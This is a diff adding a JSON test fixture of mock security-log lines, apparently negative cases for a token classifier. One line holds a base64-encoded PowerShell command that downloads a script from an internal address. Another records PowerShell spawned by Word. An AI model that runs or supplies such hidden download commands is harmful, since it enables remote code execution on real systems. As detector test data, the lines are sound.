@@ -1,0 +1,20 @@
+{
+ "note": "Real-shape SOC log content that must produce no CRYPTO and no LLMAPI token in the default page configuration.",
+ "lines": [
+  "Sep 23 10:00:01 fw01 kernel: eth0: link up, 1000 Mbps; bond0 slave eth1 active",
+  "commit 2d7e6ee4f1b9a0c3d5e7f9a1b3c5d7e9f1a3b5c7 Author: build-bot",
+  "sha256=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+  "sigma rule id 5f2f6c9e-3a1b-4c8d-9e0f-1a2b3c4d5e6f matched",
+  "pod api-gateway-7d9f8b6c5d-x2kqz restarted in namespace payments",
+  "container 4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b exited 137",
+  "powershell.exe -NoP -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAuAHAAcwAxAA==",
+  "firewall rule fw_PolicyDenyInboundTraffic hit count 42; fw_rule_allow_443 unchanged",
+  "python -c \"from huggingface_hub import hf_hub_download\"",
+  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe spawned by winword.exe",
+  "GET /api/v2/orders?page=3&sort=desc HTTP/1.1 200 1532 \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "2026-09-23T10:05:07.123Z INFO mnemonic generation disabled by policy; wallet service healthy",
+  "ENS resolver config loaded from resolver.eth.config.yaml",
+  "TOTP secret rotated for user id 8842 (length 32, base32)",
+  "Therefore the transaction was rejected by the payment gateway with reason code 51"
+ ]
+}
